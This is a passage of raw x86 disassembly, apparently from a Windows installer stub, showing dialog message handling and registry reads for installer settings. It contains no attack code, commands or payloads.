  404f62:	ff d7                	call   *%edi
  404f64:	39 1d 6c b3 47 00    	cmp    %ebx,0x47b36c
  404f6a:	75 0e                	jne    0x404f7a
  404f6c:	a1 c8 fd 45 00       	mov    0x45fdc8,%eax
  404f71:	53                   	push   %ebx
  404f72:	ff 70 34             	push   0x34(%eax)
  404f75:	e8 5c fc ff ff       	call   0x404bd6
  404f7a:	6a 01                	push   $0x1
  404f7c:	e8 82 ea ff ff       	call   0x403a03
  404f81:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  404f85:	75 be                	jne    0x404f45
  404f87:	39 75 10             	cmp    %esi,0x10(%ebp)
  404f8a:	75 b9                	jne    0x404f45
  404f8c:	53                   	push   %ebx
  404f8d:	53                   	push   %ebx
  404f8e:	68 04 10 00 00       	push   $0x1004
  404f93:	56                   	push   %esi
  404f94:	ff 15 78 82 40 00    	call   *0x408278
  404f9a:	3b c3                	cmp    %ebx,%eax
  404f9c:	89 45 0c             	mov    %eax,0xc(%ebp)
  404f9f:	0f 8e 18 ff ff ff    	jle    0x404ebd
  404fa5:	ff 15 c4 81 40 00    	call   *0x4081c4
  404fab:	6a e1                	push   $0xffffffe1
  404fad:	53                   	push   %ebx
  404fae:	8b f8                	mov    %eax,%edi
  404fb0:	e8 78 12 00 00       	call   0x40622d
  404fb5:	50                   	push   %eax
  404fb6:	6a 01                	push   $0x1
  404fb8:	53                   	push   %ebx
  404fb9:	57                   	push   %edi
  404fba:	ff 15 c0 81 40 00    	call   *0x4081c0
  404fc0:	8b 45 14             	mov    0x14(%ebp),%eax
  404fc3:	83 f8 ff             	cmp    $0xffffffff,%eax
  404fc6:	75 13                	jne    0x404fdb
  404fc8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404fcb:	50                   	push   %eax
  404fcc:	56                   	push   %esi
  404fcd:	ff 15 bc 81 40 00    	call   *0x4081bc
  404fd3:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404fd6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404fd9:	eb 07                	jmp    0x404fe2
  404fdb:	0f bf c8             	movswl %ax,%ecx
  404fde:	c1 e8 10             	shr    $0x10,%eax
  404fe1:	98                   	cwtl
  404fe2:	53                   	push   %ebx
  404fe3:	ff 75 08             	push   0x8(%ebp)
  404fe6:	53                   	push   %ebx
  404fe7:	50                   	push   %eax
  404fe8:	51                   	push   %ecx
  404fe9:	68 80 01 00 00       	push   $0x180
  404fee:	57                   	push   %edi
  404fef:	ff 15 b8 81 40 00    	call   *0x4081b8
  404ff5:	33 f6                	xor    %esi,%esi
  404ff7:	46                   	inc    %esi
  404ff8:	3b c6                	cmp    %esi,%eax
  404ffa:	0f 85 bd fe ff ff    	jne    0x404ebd
  405000:	8b 45 0c             	mov    0xc(%ebp),%eax
  405003:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  405006:	c7 45 c0 a8 fd 44 00 	movl   $0x44fda8,-0x40(%ebp)
  40500d:	c7 45 c4 1f 00 01 00 	movl   $0x1001f,-0x3c(%ebp)
  405014:	89 45 08             	mov    %eax,0x8(%ebp)
  405017:	bf 73 10 00 00       	mov    $0x1073,%edi
  40501c:	ff 4d 08             	decl   0x8(%ebp)
  40501f:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405022:	50                   	push   %eax
  405023:	ff 75 08             	push   0x8(%ebp)
  405026:	57                   	push   %edi
  405027:	ff 75 fc             	push   -0x4(%ebp)
  40502a:	ff 15 78 82 40 00    	call   *0x408278
  405030:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405034:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405037:	75 e3                	jne    0x40501c
  405039:	53                   	push   %ebx
  40503a:	ff 15 b4 81 40 00    	call   *0x4081b4
  405040:	ff 15 b0 81 40 00    	call   *0x4081b0
  405046:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405049:	50                   	push   %eax
  40504a:	6a 42                	push   $0x42
  40504c:	ff 15 20 81 40 00    	call   *0x408120
  405052:	50                   	push   %eax
  405053:	89 45 08             	mov    %eax,0x8(%ebp)
  405056:	ff 15 d0 80 40 00    	call   *0x4080d0
  40505c:	8b f0                	mov    %eax,%esi
  40505e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405061:	50                   	push   %eax
  405062:	53                   	push   %ebx
  405063:	57                   	push   %edi
  405064:	ff 75 fc             	push   -0x4(%ebp)
  405067:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40506a:	ff 15 78 82 40 00    	call   *0x408278
  405070:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405073:	6a 0d                	push   $0xd
  405075:	58                   	pop    %eax
  405076:	66 89 06             	mov    %ax,(%esi)
  405079:	46                   	inc    %esi
  40507a:	46                   	inc    %esi
  40507b:	6a 0a                	push   $0xa
  40507d:	58                   	pop    %eax
  40507e:	66 89 06             	mov    %ax,(%esi)
  405081:	46                   	inc    %esi
  405082:	46                   	inc    %esi
  405083:	43                   	inc    %ebx
  405084:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405087:	7c d5                	jl     0x40505e
  405089:	ff 75 08             	push   0x8(%ebp)
  40508c:	ff 15 cc 80 40 00    	call   *0x4080cc
  405092:	ff 75 08             	push   0x8(%ebp)
  405095:	6a 0d                	push   $0xd
  405097:	ff 15 ac 81 40 00    	call   *0x4081ac
  40509d:	ff 15 a8 81 40 00    	call   *0x4081a8
  4050a3:	e9 15 fe ff ff       	jmp    0x404ebd
  4050a8:	83 ec 10             	sub    $0x10,%esp
  4050ab:	53                   	push   %ebx
  4050ac:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4050b0:	55                   	push   %ebp
  4050b1:	b9 10 01 00 00       	mov    $0x110,%ecx
  4050b6:	56                   	push   %esi
  4050b7:	57                   	push   %edi
  4050b8:	3b d9                	cmp    %ecx,%ebx
  4050ba:	0f 84 3c 01 00 00    	je     0x4051fc
  4050c0:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  4050c6:	0f 84 30 01 00 00    	je     0x4051fc
  4050cc:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4050d0:	33 ed                	xor    %ebp,%ebp
  4050d2:	83 fb 47             	cmp    $0x47,%ebx
  4050d5:	75 13                	jne    0x4050ea
  4050d7:	6a 13                	push   $0x13
  4050d9:	55                   	push   %ebp
  4050da:	55                   	push   %ebp
  4050db:	55                   	push   %ebp
  4050dc:	55                   	push   %ebp
  4050dd:	57                   	push   %edi
  4050de:	ff 35 88 3d 44 00    	push   0x443d88
  4050e4:	ff 15 e0 81 40 00    	call   *0x4081e0
  4050ea:	83 fb 05             	cmp    $0x5,%ebx
  4050ed:	75 18                	jne    0x405107
  4050ef:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4050f3:	48                   	dec    %eax
  4050f4:	f7 d8                	neg    %eax
  4050f6:	1b c0                	sbb    %eax,%eax
  4050f8:	23 c3                	and    %ebx,%eax
  4050fa:	50                   	push   %eax
  4050fb:	ff 35 88 3d 44 00    	push   0x443d88
  405101:	ff 15 34 82 40 00    	call   *0x408234
  405107:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  40510d:	75 1a                	jne    0x405129
  40510f:	ff 35 68 32 47 00    	push   0x473268
  405115:	ff 15 1c 82 40 00    	call   *0x40821c
  40511b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40511f:	a3 68 32 47 00       	mov    %eax,0x473268
  405124:	e9 03 04 00 00       	jmp    0x40552c
  405129:	83 fb 11             	cmp    $0x11,%ebx
  40512c:	75 11                	jne    0x40513f
  40512e:	55                   	push   %ebp
  40512f:	55                   	push   %ebp
  405130:	57                   	push   %edi
  405131:	ff 15 64 82 40 00    	call   *0x408264
  405137:	33 c0                	xor    %eax,%eax
  405139:	40                   	inc    %eax
  40513a:	e9 12 04 00 00       	jmp    0x405551
  40513f:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  405145:	0f 85 9d 00 00 00    	jne    0x4051e8
  40514b:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  405150:	56                   	push   %esi
  405151:	57                   	push   %edi
  405152:	ff 15 60 82 40 00    	call   *0x408260
  405158:	8b f8                	mov    %eax,%edi
  40515a:	3b fd                	cmp    %ebp,%edi
  40515c:	74 1d                	je     0x40517b
  40515e:	55                   	push   %ebp
  40515f:	55                   	push   %ebp
  405160:	68 f3 00 00 00       	push   $0xf3
  405165:	57                   	push   %edi
  405166:	ff 15 78 82 40 00    	call   *0x408278
  40516c:	57                   	push   %edi
  40516d:	ff 15 dc 81 40 00    	call   *0x4081dc
  405173:	85 c0                	test   %eax,%eax
  405175:	0f 84 d4 03 00 00    	je     0x40554f
  40517b:	83 fe 01             	cmp    $0x1,%esi
  40517e:	75 03                	jne    0x405183
  405180:	56                   	push   %esi
  405181:	eb 2e                	jmp    0x4051b1
  405183:	83 fe 03             	cmp    $0x3,%esi
  405186:	75 0c                	jne    0x405194
  405188:	39 2d 18 a0 40 00    	cmp    %ebp,0x40a018
  40518e:	7e 3f                	jle    0x4051cf
  405190:	6a ff                	push   $0xffffffff
  405192:	eb 1d                	jmp    0x4051b1
  405194:	6a 02                	push   $0x2
  405196:	5f                   	pop    %edi
  405197:	3b f7                	cmp    %edi,%esi
  405199:	75 34                	jne    0x4051cf
  40519b:	39 2d 6c b3 47 00    	cmp    %ebp,0x47b36c
  4051a1:	74 15                	je     0x4051b8
  4051a3:	57                   	push   %edi
  4051a4:	e8 74 c2 ff ff       	call   0x40141d
  4051a9:	89 3d d0 fd 45 00    	mov    %edi,0x45fdd0
  4051af:	6a 78                	push   $0x78
  4051b1:	e8 4d e8 ff ff       	call   0x403a03
  4051b6:	eb 30                	jmp    0x4051e8
  4051b8:	6a 03                	push   $0x3
  4051ba:	e8 5e c2 ff ff       	call   0x40141d
  4051bf:	85 c0                	test   %eax,%eax
  4051c1:	75 25                	jne    0x4051e8
  4051c3:	c7 05 d0 fd 45 00 01 	movl   $0x1,0x45fdd0
  4051ca:	00 00 00 
  4051cd:	eb e0                	jmp    0x4051af
  4051cf:	ff 74 24 30          	push   0x30(%esp)
  4051d3:	ff 74 24 30          	push   0x30(%esp)
  4051d7:	68 11 01 00 00       	push   $0x111
  4051dc:	ff 35 68 32 47 00    	push   0x473268
  4051e2:	ff 15 78 82 40 00    	call   *0x408278
  4051e8:	ff 74 24 30          	push   0x30(%esp)
  4051ec:	8b c3                	mov    %ebx,%eax
  4051ee:	ff 74 24 30          	push   0x30(%esp)
  4051f2:	e8 be e8 ff ff       	call   0x403ab5
  4051f7:	e9 55 03 00 00       	jmp    0x405551
  4051fc:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405200:	8b 7c 24 24          	mov    0x24(%esp),%edi
  405204:	a3 64 fd 43 00       	mov    %eax,0x43fd64
  405209:	3b d9                	cmp    %ecx,%ebx
  40520b:	75 4d                	jne    0x40525a
  40520d:	8b 35 60 82 40 00    	mov    0x408260,%esi
  405213:	6a 01                	push   $0x1
  405215:	57                   	push   %edi
  405216:	89 3d b4 b2 47 00    	mov    %edi,0x47b2b4
  40521c:	ff d6                	call   *%esi
  40521e:	6a 02                	push   $0x2
  405220:	57                   	push   %edi
  405221:	a3 8c 3d 44 00       	mov    %eax,0x443d8c
  405226:	ff d6                	call   *%esi
  405228:	6a ff                	push   $0xffffffff
  40522a:	6a 1c                	push   $0x1c
  40522c:	57                   	push   %edi
  40522d:	a3 7c 3d 44 00       	mov    %eax,0x443d7c
  405232:	e8 f3 e7 ff ff       	call   0x403a2a
  405237:	ff 35 70 32 47 00    	push   0x473270
  40523d:	6a f2                	push   $0xfffffff2
  40523f:	57                   	push   %edi
  405240:	ff 15 d8 81 40 00    	call   *0x4081d8
  405246:	6a 04                	push   $0x4
  405248:	e8 d0 c1 ff ff       	call   0x40141d
  40524d:	a3 74 32 47 00       	mov    %eax,0x473274
  405252:	33 c0                	xor    %eax,%eax
  405254:	40                   	inc    %eax
  405255:	a3 64 fd 43 00       	mov    %eax,0x43fd64
  40525a:	8b 0d 18 a0 40 00    	mov    0x40a018,%ecx
  405260:	8b f1                	mov    %ecx,%esi
  405262:	c1 e6 06             	shl    $0x6,%esi
  405265:	03 35 c0 b2 47 00    	add    0x47b2c0,%esi
  40526b:	33 ed                	xor    %ebp,%ebp
  40526d:	3b cd                	cmp    %ebp,%ecx
  40526f:	7c 3e                	jl     0x4052af
  405271:	83 f8 01             	cmp    $0x1,%eax
  405274:	75 31                	jne    0x4052a7
  405276:	55                   	push   %ebp
  405277:	ff 76 10             	push   0x10(%esi)
  40527a:	e8 1c c1 ff ff       	call   0x40139b
  40527f:	85 c0                	test   %eax,%eax
  405281:	74 24                	je     0x4052a7
  405283:	6a 01                	push   $0x1
  405285:	55                   	push   %ebp
  405286:	68 0f 04 00 00       	push   $0x40f
  40528b:	ff 35 68 32 47 00    	push   0x473268
  405291:	ff 15 78 82 40 00    	call   *0x408278
  405297:	33 c0                	xor    %eax,%eax
  405299:	39 2d 74 32 47 00    	cmp    %ebp,0x473274
  40529f:	0f 94 c0             	sete   %al
  4052a2:	e9 aa 02 00 00       	jmp    0x405551
  4052a7:	39 2e                	cmp    %ebp,(%esi)
  4052a9:	0f 84 a0 02 00 00    	je     0x40554f
  4052af:	68 0b 04 00 00       	push   $0x40b
  4052b4:	e8 e1 e7 ff ff       	call   0x403a9a
  4052b9:	a1 64 fd 43 00       	mov    0x43fd64,%eax
  4052be:	01 05 18 a0 40 00    	add    %eax,0x40a018
  4052c4:	c1 e0 06             	shl    $0x6,%eax
  4052c7:	03 f0                	add    %eax,%esi
  4052c9:	a1 18 a0 40 00       	mov    0x40a018,%eax
  4052ce:	3b 05 c4 b2 47 00    	cmp    0x47b2c4,%eax
  4052d4:	75 07                	jne    0x4052dd
  4052d6:	6a 01                	push   $0x1
  4052d8:	e8 40 c1 ff ff       	call   0x40141d
  4052dd:	39 2d 74 32 47 00    	cmp    %ebp,0x473274
  4052e3:	0f 85 24 02 00 00    	jne    0x40550d
  4052e9:	a1 c4 b2 47 00       	mov    0x47b2c4,%eax
  4052ee:	39 05 18 a0 40 00    	cmp    %eax,0x40a018
  4052f4:	0f 83 13 02 00 00    	jae    0x40550d
  4052fa:	ff 76 24             	push   0x24(%esi)
  4052fd:	8b 5e 14             	mov    0x14(%esi),%ebx
  405300:	68 f0 40 4f 00       	push   $0x4f40f0
  405305:	e8 23 0f 00 00       	call   0x40622d
  40530a:	ff 76 20             	push   0x20(%esi)
  40530d:	68 19 fc ff ff       	push   $0xfffffc19
  405312:	57                   	push   %edi
  405313:	e8 12 e7 ff ff       	call   0x403a2a
  405318:	ff 76 1c             	push   0x1c(%esi)
  40531b:	68 1b fc ff ff       	push   $0xfffffc1b
  405320:	57                   	push   %edi
  405321:	e8 04 e7 ff ff       	call   0x403a2a
  405326:	ff 76 28             	push   0x28(%esi)
  405329:	68 1a fc ff ff       	push   $0xfffffc1a
  40532e:	57                   	push   %edi
  40532f:	e8 f6 e6 ff ff       	call   0x403a2a
  405334:	6a 03                	push   $0x3
  405336:	57                   	push   %edi
  405337:	ff 15 60 82 40 00    	call   *0x408260
  40533d:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  405341:	39 2d 6c b3 47 00    	cmp    %ebp,0x47b36c
  405347:	74 09                	je     0x405352
  405349:	81 e3 fd fe ff ff    	and    $0xfffffefd,%ebx
  40534f:	83 cb 04             	or     $0x4,%ebx
  405352:	8b cb                	mov    %ebx,%ecx
  405354:	83 e1 08             	and    $0x8,%ecx
  405357:	51                   	push   %ecx
  405358:	50                   	push   %eax
  405359:	ff 15 34 82 40 00    	call   *0x408234
  40535f:	8b c3                	mov    %ebx,%eax
  405361:	25 00 01 00 00       	and    $0x100,%eax
  405366:	50                   	push   %eax
  405367:	ff 74 24 30          	push   0x30(%esp)
  40536b:	ff 15 70 82 40 00    	call   *0x408270
  405371:	8b c3                	mov    %ebx,%eax
  405373:	83 e0 02             	and    $0x2,%eax
  405376:	50                   	push   %eax
  405377:	e8 f4 e6 ff ff       	call   0x403a70
  40537c:	83 e3 04             	and    $0x4,%ebx
  40537f:	53                   	push   %ebx
  405380:	ff 35 7c 3d 44 00    	push   0x443d7c
  405386:	ff 15 70 82 40 00    	call   *0x408270
  40538c:	3b dd                	cmp    %ebp,%ebx
  40538e:	74 03                	je     0x405393
  405390:	55                   	push   %ebp
  405391:	eb 02                	jmp    0x405395
  405393:	6a 01                	push   $0x1
  405395:	68 60 f0 00 00       	push   $0xf060
  40539a:	55                   	push   %ebp
  40539b:	57                   	push   %edi
  40539c:	ff 15 d4 81 40 00    	call   *0x4081d4
  4053a2:	50                   	push   %eax
  4053a3:	ff 15 d0 81 40 00    	call   *0x4081d0
  4053a9:	8b 1d 78 82 40 00    	mov    0x408278,%ebx
  4053af:	6a 01                	push   $0x1
  4053b1:	55                   	push   %ebp
  4053b2:	68 f4 00 00 00       	push   $0xf4
  4053b7:	ff 74 24 38          	push   0x38(%esp)
  4053bb:	ff d3                	call   *%ebx
  4053bd:	39 2d 6c b3 47 00    	cmp    %ebp,0x47b36c
  4053c3:	74 13                	je     0x4053d8
  4053c5:	55                   	push   %ebp
  4053c6:	6a 02                	push   $0x2
  4053c8:	68 01 04 00 00       	push   $0x401
  4053cd:	57                   	push   %edi
  4053ce:	ff d3                	call   *%ebx
  4053d0:	ff 35 7c 3d 44 00    	push   0x443d7c
  4053d6:	eb 06                	jmp    0x4053de
  4053d8:	ff 35 8c 3d 44 00    	push   0x443d8c
  4053de:	e8 a0 e6 ff ff       	call   0x403a83
  4053e3:	68 a0 32 47 00       	push   $0x4732a0
  4053e8:	bb a8 fd 44 00       	mov    $0x44fda8,%ebx
  4053ed:	53                   	push   %ebx
  4053ee:	e8 28 08 00 00       	call   0x405c1b
  4053f3:	ff 76 18             	push   0x18(%esi)
  4053f6:	53                   	push   %ebx
  4053f7:	e8 35 08 00 00       	call   0x405c31
  4053fc:	8d 04 45 a8 fd 44 00 	lea    0x44fda8(,%eax,2),%eax
  405403:	50                   	push   %eax
  405404:	e8 24 0e 00 00       	call   0x40622d
  405409:	53                   	push   %ebx
  40540a:	57                   	push   %edi
  40540b:	ff 15 28 82 40 00    	call   *0x408228
  405411:	55                   	push   %ebp
  405412:	ff 76 08             	push   0x8(%esi)
  405415:	e8 81 bf ff ff       	call   0x40139b
  40541a:	85 c0                	test   %eax,%eax
  40541c:	0f 85 97 fe ff ff    	jne    0x4052b9
  405422:	39 2e                	cmp    %ebp,(%esi)
  405424:	0f 84 8f fe ff ff    	je     0x4052b9
  40542a:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  40542e:	75 1d                	jne    0x40544d
  405430:	39 2d 6c b3 47 00    	cmp    %ebp,0x47b36c
  405436:	0f 85 13 01 00 00    	jne    0x40554f
  40543c:	39 2d 60 b3 47 00    	cmp    %ebp,0x47b360
  405442:	0f 85 71 fe ff ff    	jne    0x4052b9
  405448:	e9 02 01 00 00       	jmp    0x40554f
  40544d:	ff 35 68 32 47 00    	push   0x473268
  405453:	ff 15 1c 82 40 00    	call   *0x40821c
  405459:	39 2e                	cmp    %ebp,(%esi)
  40545b:	89 35 c8 fd 45 00    	mov    %esi,0x45fdc8
  405461:	0f 8e c5 00 00 00    	jle    0x40552c
  405467:	8b 46 04             	mov    0x4(%esi),%eax
  40546a:	56                   	push   %esi
  40546b:	ff 34 85 1c a0 40 00 	push   0x40a01c(,%eax,4)
  405472:	66 8b 06             	mov    (%esi),%ax
  405475:	66 03 05 7c 32 47 00 	add    0x47327c,%ax
  40547c:	57                   	push   %edi
  40547d:	0f b7 c0             	movzwl %ax,%eax
  405480:	50                   	push   %eax
  405481:	ff 35 b8 b2 47 00    	push   0x47b2b8
  405487:	ff 15 20 82 40 00    	call   *0x408220
  40548d:	a3 68 32 47 00       	mov    %eax,0x473268
  405492:	3b c5                	cmp    %ebp,%eax
  405494:	0f 84 92 00 00 00    	je     0x40552c
  40549a:	ff 76 2c             	push   0x2c(%esi)
  40549d:	6a 06                	push   $0x6
  40549f:	50                   	push   %eax
  4054a0:	e8 85 e5 ff ff       	call   0x403a2a
  4054a5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4054a9:	50                   	push   %eax
  4054aa:	68 fa 03 00 00       	push   $0x3fa
  4054af:	57                   	push   %edi
  4054b0:	ff 15 60 82 40 00    	call   *0x408260
  4054b6:	50                   	push   %eax
  4054b7:	ff 15 bc 81 40 00    	call   *0x4081bc
  4054bd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4054c1:	50                   	push   %eax
  4054c2:	57                   	push   %edi
  4054c3:	ff 15 94 81 40 00    	call   *0x408194
  4054c9:	6a 15                	push   $0x15
  4054cb:	55                   	push   %ebp
  4054cc:	55                   	push   %ebp
  4054cd:	ff 74 24 20          	push   0x20(%esp)
  4054d1:	ff 74 24 20          	push   0x20(%esp)
  4054d5:	55                   	push   %ebp
  4054d6:	ff 35 68 32 47 00    	push   0x473268
  4054dc:	ff 15 e0 81 40 00    	call   *0x4081e0
  4054e2:	55                   	push   %ebp
  4054e3:	ff 76 0c             	push   0xc(%esi)
  4054e6:	e8 b0 be ff ff       	call   0x40139b
  4054eb:	39 2d 74 32 47 00    	cmp    %ebp,0x473274
  4054f1:	75 5c                	jne    0x40554f
  4054f3:	6a 08                	push   $0x8
  4054f5:	ff 35 68 32 47 00    	push   0x473268
  4054fb:	ff 15 34 82 40 00    	call   *0x408234
  405501:	68 05 04 00 00       	push   $0x405
  405506:	e8 8f e5 ff ff       	call   0x403a9a
  40550b:	eb 1f                	jmp    0x40552c
  40550d:	ff 35 68 32 47 00    	push   0x473268
  405513:	ff 15 1c 82 40 00    	call   *0x40821c
  405519:	ff 35 d0 fd 45 00    	push   0x45fdd0
  40551f:	89 2d b4 b2 47 00    	mov    %ebp,0x47b2b4
  405525:	57                   	push   %edi
  405526:	ff 15 cc 81 40 00    	call   *0x4081cc
  40552c:	39 2d dc fd 45 00    	cmp    %ebp,0x45fddc
  405532:	75 1b                	jne    0x40554f
  405534:	39 2d 68 32 47 00    	cmp    %ebp,0x473268
  40553a:	74 13                	je     0x40554f
  40553c:	6a 0a                	push   $0xa
  40553e:	57                   	push   %edi
  40553f:	ff 15 34 82 40 00    	call   *0x408234
  405545:	c7 05 dc fd 45 00 01 	movl   $0x1,0x45fddc
  40554c:	00 00 00 
  40554f:	33 c0                	xor    %eax,%eax
  405551:	5f                   	pop    %edi
  405552:	5e                   	pop    %esi
  405553:	5d                   	pop    %ebp
  405554:	5b                   	pop    %ebx
  405555:	83 c4 10             	add    $0x10,%esp
  405558:	c2 10 00             	ret    $0x10
  40555b:	55                   	push   %ebp
  40555c:	8b ec                	mov    %esp,%ebp
  40555e:	83 ec 18             	sub    $0x18,%esp
  405561:	53                   	push   %ebx
  405562:	56                   	push   %esi
  405563:	57                   	push   %edi
  405564:	8b 3d bc b2 47 00    	mov    0x47b2bc,%edi
  40556a:	6a 06                	push   $0x6
  40556c:	e8 b1 07 00 00       	call   0x405d22
  405571:	33 db                	xor    %ebx,%ebx
  405573:	3b c3                	cmp    %ebx,%eax
  405575:	74 12                	je     0x405589
  405577:	ff d0                	call   *%eax
  405579:	0f b7 c0             	movzwl %ax,%eax
  40557c:	50                   	push   %eax
  40557d:	68 c0 c0 4d 00       	push   $0x4dc0c0
  405582:	e8 db 05 00 00       	call   0x405b62
  405587:	eb 5b                	jmp    0x4055e4
  405589:	6a 30                	push   $0x30
  40558b:	58                   	pop    %eax
  40558c:	6a 78                	push   $0x78
  40558e:	66 a3 c0 c0 4d 00    	mov    %ax,0x4dc0c0
  405594:	58                   	pop    %eax
  405595:	53                   	push   %ebx
  405596:	be a8 fd 44 00       	mov    $0x44fda8,%esi
  40559b:	56                   	push   %esi
  40559c:	53                   	push   %ebx
  40559d:	66 a3 c2 c0 4d 00    	mov    %ax,0x4dc0c2
  4055a3:	68 f8 86 40 00       	push   $0x4086f8
  4055a8:	33 c0                	xor    %eax,%eax
  4055aa:	68 01 00 00 80       	push   $0x80000001
  4055af:	66 a3 c4 c0 4d 00    	mov    %ax,0x4dc0c4
  4055b5:	e8 2a 05 00 00       	call   0x405ae4
  4055ba:	66 39 1d a8 fd 44 00 	cmp    %bx,0x44fda8
  4055c1:	75 16                	jne    0x4055d9
  4055c3:	53                   	push   %ebx
  4055c4:	56                   	push   %esi
  4055c5:	68 34 87 40 00       	push   $0x408734
  4055ca:	68 a8 86 40 00       	push   $0x4086a8
  4055cf:	68 03 00 00 80       	push   $0x80000003
  4055d4:	e8 0b 05 00 00       	call   0x405ae4
  4055d9:	56                   	push   %esi
  4055da:	68 c0 c0 4d 00       	push   $0x4dc0c0
  4055df:	e8 53 06 00 00       	call   0x405c37
  4055e4:	e8 76 e5 ff ff       	call   0x403b5f
  4055e9:	a1 08 b3 47 00       	mov    0x47b308,%eax
  4055ee:	83 e0 20             	and    $0x20,%eax
  4055f1:	68 a8 00 4d 00       	push   $0x4d00a8
  4055f6:	a3 60 b3 47 00       	mov    %eax,0x47b360
  4055fb:	c7 05 7c b3 47 00 00 	movl   $0x10000,0x47b37c
  405602:	00 01 00 
  405605:	e8 9b 0b 00 00       	call   0x4061a5
  40560a:	85 c0                	test   %eax,%eax
  40560c:	0f 85 94 00 00 00    	jne    0x4056a6
  405612:	8b 4f 48             	mov    0x48(%edi),%ecx
  405615:	3b cb                	cmp    %ebx,%ecx
  405617:	0f 84 89 00 00 00    	je     0x4056a6
  40561d:	a1 d8 b2 47 00       	mov    0x47b2d8,%eax
  405622:	8b 57 4c             	mov    0x4c(%edi),%edx
  405625:	53                   	push   %ebx
  405626:	be 20 b2 46 00       	mov    $0x46b220,%esi
  40562b:	56                   	push   %esi
  40562c:	8d 14 50             	lea    (%eax,%edx,2),%edx
  40562f:	52                   	push   %edx
  405630:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  405633:	50                   	push   %eax
  405634:	ff 77 44             	push   0x44(%edi)
  405637:	e8 a8 04 00 00       	call   0x405ae4
  40563c:	66 a1 20 b2 46 00    	mov    0x46b220,%ax
  405642:	66 3b c3             	cmp    %bx,%ax
  405645:	74 5f                	je     0x4056a6
  405647:	66 83 f8 22          	cmp    $0x22,%ax
  40564b:	75 14                	jne    0x405661
  40564d:	b8 22 b2 46 00       	mov    $0x46b222,%eax
  405652:	6a 22                	push   $0x22
  405654:	50                   	push   %eax
  405655:	8b f0                	mov    %eax,%esi
  405657:	e8 ba 02 00 00       	call   0x405916
  40565c:	33 c9                	xor    %ecx,%ecx
  40565e:	66 89 08             	mov    %cx,(%eax)
  405661:	56                   	push   %esi
  405662:	e8 ca 05 00 00       	call   0x405c31
  405667:	8d 44 46 f8          	lea    -0x8(%esi,%eax,2),%eax
  40566b:	3b c6                	cmp    %esi,%eax
  40566d:	76 26                	jbe    0x405695
  40566f:	68 9c 86 40 00       	push   $0x40869c
  405674:	50                   	push   %eax
  405675:	ff 15 14 81 40 00    	call   *0x408114
  40567b:	85 c0                	test   %eax,%eax
  40567d:	75 16                	jne    0x405695
  40567f:	56                   	push   %esi
  405680:	ff 15 7c 80 40 00    	call   *0x40807c
  405686:	83 f8 ff             	cmp    $0xffffffff,%eax
  405689:	74 04                	je     0x40568f
  40568b:	a8 10                	test   $0x10,%al
  40568d:	75 06                	jne    0x405695
  40568f:	56                   	push   %esi
  405690:	e8 e3 0a 00 00       	call   0x406178
  405695:	56                   	push   %esi
  405696:	e8 ae 0a 00 00       	call   0x406149
  40569b:	50                   	push   %eax
  40569c:	68 a8 00 4d 00       	push   $0x4d00a8
  4056a1:	e8 75 05 00 00       	call   0x405c1b
  4056a6:	be a8 00 4d 00       	mov    $0x4d00a8,%esi
  4056ab:	56                   	push   %esi
  4056ac:	e8 f4 0a 00 00       	call   0x4061a5
  4056b1:	85 c0                	test   %eax,%eax
  4056b3:	75 0c                	jne    0x4056c1
  4056b5:	ff b7 18 01 00 00    	push   0x118(%edi)
  4056bb:	56                   	push   %esi
  4056bc:	e8 6c 0b 00 00       	call   0x40622d
  4056c1:	68 40 80 00 00       	push   $0x8040
  4056c6:	53                   	push   %ebx
  4056c7:	53                   	push   %ebx
  4056c8:	6a 01                	push   $0x1
  4056ca:	6a 67                	push   $0x67
  4056cc:	ff 35 b8 b2 47 00    	push   0x47b2b8
  4056d2:	ff 15 68 82 40 00    	call   *0x408268
  4056d8:	a3 70 32 47 00       	mov    %eax,0x473270
  4056dd:	83 7f 50 ff          	cmpl   $0xffffffff,0x50(%edi)
  4056e1:	be 40 32 47 00       	mov    $0x473240,%esi
  4056e6:	0f 84 8a 00 00 00    	je     0x405776
  4056ec:	8b 0d 94 86 40 00    	mov    0x408694,%ecx
  4056f2:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4056f5:	8b 0d 98 86 40 00    	mov    0x408698,%ecx
  4056fb:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4056fe:	8b 0d b8 b2 47 00    	mov    0x47b2b8,%ecx
  405704:	a3 54 32 47 00       	mov    %eax,0x473254
  405709:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40570c:	56                   	push   %esi
  40570d:	c7 05 44 32 47 00 00 	movl   $0x401000,0x473244
  405714:	10 40 00 
  405717:	89 0d 50 32 47 00    	mov    %ecx,0x473250
  40571d:	a3 64 32 47 00       	mov    %eax,0x473264
  405722:	ff 15 f4 81 40 00    	call   *0x4081f4
  405728:	66 85 c0             	test   %ax,%ax
  40572b:	0f 84 17 01 00 00    	je     0x405848
  405731:	53                   	push   %ebx
  405732:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405735:	50                   	push   %eax
  405736:	53                   	push   %ebx
  405737:	6a 30                	push   $0x30
